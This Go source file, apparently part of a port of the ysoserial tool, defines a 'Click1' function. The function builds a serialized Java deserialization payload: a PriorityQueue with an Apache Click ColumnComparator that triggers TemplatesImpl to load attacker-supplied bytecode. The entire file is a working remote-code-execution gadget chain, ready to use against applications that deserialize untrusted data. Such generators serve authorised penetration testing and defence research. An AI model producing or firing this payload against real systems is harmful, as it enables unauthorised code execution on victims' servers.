package ysoserial

func Click1(bytecodes []byte) []byte {
	return ClassObject{
		name:             "java.util.PriorityQueue",
		serialVersionUID: -7720805057305804111,
		classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
		fields: []Field{
			{Integer, "size", 2},
			{"Ljava/util/Comparator;", "comparator", ClassObject{
				name:             "org.apache.click.control.Column$ColumnComparator",
				serialVersionUID: 1,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{Integer, "ascendingSort", 1},
					{"Lorg/apache/click/control/Column;", "column", ClassObject{
						name:             "org.apache.click.control.Column",
						serialVersionUID: 1,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{Boolean, "autolink", "false"},
							{Boolean, "escapeHtml", "true"},
							{Integer, "maxLength", 0},
							{"Ljava/util/Map;", "attributes", nil},
							{Object, "comparator", nil},
							{"Ljava/lang/String;", "dataClass", nil},
							{Object, "dataStyles", nil},
							{"Lorg/apache/click/control/Decorator;", "decorator", nil},
							{Object, "format", nil},
							{Object, "headerClass", nil},
							{Object, "headerStyles", nil},
							{Object, "headerTitle", nil},
							{"Ljava/text/MessageFormat;", "messageFormat", nil},
							{Object, "name", "outputProperties"},
							{"Ljava/lang/Boolean;", "renderId", nil},
							{Object, "sortable", nil},
							{"Lorg/apache/click/control/Table;", "table", ClassObject{
								name:             "org.apache.click.control.Table",
								serialVersionUID: 1,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{Integer, "bannerPosition", 2},
									{Boolean, "hoverRows", "false"},
									{Boolean, "nullifyRowListOnDestroy", "true"},
									{Integer, "pageNumber", 0},
									{Integer, "pageSize", 0},
									{Integer, "paginatorAttachment", 1},
									{Boolean, "renderId", "false"},
									{Integer, "rowCount", 0},
									{Boolean, "showBanner", "false"},
									{Boolean, "sortable", "false"},
									{Boolean, "sorted", "false"},
									{Boolean, "sortedAscending", "true"},
									{Object, "caption", nil},
									{"Ljava/util/List;", "columnList", ClassObject{
										name:             "java.util.ArrayList",
										serialVersionUID: 8683452581122892189,
										classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
										fields: []Field{
											{Integer, "size", 0},
										},
										objectAnnotations: interfaces(
											blockData{0x00, 0x00, 0x00, 0x00},
										),
										super: nil,
									}},
									{Object, "columns", ClassObject{
										name:             "java.util.HashMap",
										serialVersionUID: 362498820763181265,
										classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
										fields: []Field{
											{Float, "loadFactor", 0.75},
											{Integer, "threshold", 0},
										},
										objectAnnotations: interfaces(
											blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00},
										),
										super: nil,
									}},
									{"Lorg/apache/click/control/ActionLink;", "controlLink", nil},
									{Object, "controlList", nil},
									{"Lorg/apache/click/dataprovider/DataProvider;", "dataProvider", nil},
									{Object, "height", nil},
									{"Lorg/apache/click/control/Renderable;", "paginator", nil},
									{Object, "rowList", nil},
									{Object, "sortedColumn", nil},
									{Object, "width", nil},
								},
							}},
							{Object, "titleProperty", nil},
							{Object, "width", nil},
						},
					}},
				},
				objectAnnotations: interfaces(),
				super:             nil,
			}},
		},
		objectAnnotations: interfaces(
			blockData{0x00, 0x00, 0x00, 0x03},
			ClassObject{
				name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
				serialVersionUID: 673094361519270707,
				classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
				fields: []Field{
					{Integer, "_indentNumber", 0},
					{Integer, "_transletIndex", 0},
					{"[[B", "_bytecodes", ArrayObject{
						name:             "[[B",
						serialVersionUID: 5475560301672258359,
						classDescFlags:   SC_SERIALIZABLE,
						values: interfaces(
							ArrayObject{
								name:             "[B",
								serialVersionUID: -5984413125824719648,
								classDescFlags:   SC_SERIALIZABLE,
								values:           interfaces(bytecodes),
							},
							ArrayObject{
								name:             "[B",
								serialVersionUID: -5984413125824719648,
								classDescFlags:   SC_SERIALIZABLE,
								values: interfaces(
									byte(0xca), byte(0xfe), byte(0xba), byte(0xbe), byte(0x00), byte(0x33), byte(0x00), byte(0x11), byte(0x01), byte(0x00), byte(0x23), byte(0x6f), byte(0x72), byte(0x67), byte(0x2f), byte(0x61), byte(0x70), byte(0x61), byte(0x63), byte(0x68), byte(0x65), byte(0x2f), byte(0x6c), byte(0x6f), byte(0x67), byte(0x34), byte(0x6a), byte(0x2f), byte(0x62), byte(0x63), byte(0x65), byte(0x6c), byte(0x2f), byte(0x67), byte(0x65), byte(0x6e), byte(0x65), byte(0x72), byte(0x69), byte(0x63), byte(0x2f), byte(0x49), byte(0x55), byte(0x53), byte(0x48), byte(0x52), byte(0x07), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x2f), byte(0x6c), byte(0x61), byte(0x6e), byte(0x67), byte(0x2f), byte(0x4f), byte(0x62), byte(0x6a), byte(0x65), byte(0x63), byte(0x74), byte(0x07), byte(0x00), byte(0x03), byte(0x01), byte(0x00), byte(0x0a), byte(0x53), byte(0x6f), byte(0x75), byte(0x72), byte(0x63), byte(0x65), byte(0x46), byte(0x69), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x0a), byte(0x49), byte(0x55), byte(0x53), byte(0x48), byte(0x52), byte(0x2e), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x01), byte(0x00), byte(0x10), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x56), byte(0x65), byte(0x72), byte(0x73), byte(0x69), byte(0x6f), byte(0x6e), byte(0x55), byte(0x49), byte(0x44), byte(0x01), byte(0x00), byte(0x01), byte(0x4a), byte(0x05), byte(0x71), byte(0xe6), byte(0x69), byte(0xee), byte(0x3c), byte(0x6d), byte(0x47), byte(0x18), byte(0x01), byte(0x00), byte(0x0d), byte(0x43), byte(0x6f), byte(0x6e), byte(0x73), byte(0x74), byte(0x61), byte(0x6e), byte(0x74), byte(0x56), byte(0x61), byte(0x6c), byte(0x75), byte(0x65), byte(0x01), byte(0x00), byte(0x06), byte(0x3c), byte(0x69), byte(0x6e), byte(0x69), byte(0x74), byte(0x3e), byte(0x01), byte(0x00), byte(0x03), byte(0x28), byte(0x29), byte(0x56), byte(0x0c), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x0a), byte(0x00), byte(0x04), byte(0x00), byte(0x0e), byte(0x01), byte(0x00), byte(0x04), byte(0x43), byte(0x6f), byte(0x64), byte(0x65), byte(0x00), byte(0x21), byte(0x00), byte(0x02), byte(0x00), byte(0x04), byte(0x00), byte(0x01), byte(0x00), byte(0x1a), byte(0x00), byte(0x07), byte(0x00), byte(0x08), byte(0x00), byte(0x01), byte(0x00), byte(0x0b), byte(0x00), byte(0x02), byte(0x00), byte(0x09), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x00), byte(0x11), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x2a), byte(0xb7), byte(0x00), byte(0x0f), byte(0xb1), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x00), byte(0x02), byte(0x00), byte(0x06),
								),
							},
						),
					}},
					{"[Ljava/lang/Class;", "_class", nil},
					{Object, "_name", "VQSPYONI"},
					{"Ljava/util/Properties;", "_outputProperties", nil},
				},
				objectAnnotations: interfaces(
					ClassObject{
						name:             "java.math.BigInteger",
						serialVersionUID: -8287574255936472291,
						classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
						fields: []Field{
							{Integer, "bitCount", -1},
							{Integer, "bitLength", -1},
							{Integer, "firstNonzeroByteNum", -2},
							{Integer, "lowestSetBit", -2},
							{Integer, "signum", 1},
							{"[B", "magnitude", ArrayObject{
								values: interfaces(),
							}},
						},
						objectAnnotations: interfaces(),
						super: &ClassObject{
							name:              "java.lang.Number",
							serialVersionUID:  -8742448824652078965,
							classDescFlags:    SC_SERIALIZABLE,
							objectAnnotations: interfaces(),
							super:             nil,
						},
					},
				),
				super: nil,
			},
		),
		super: nil,
	}.SerializeWithMagicHeader()
}
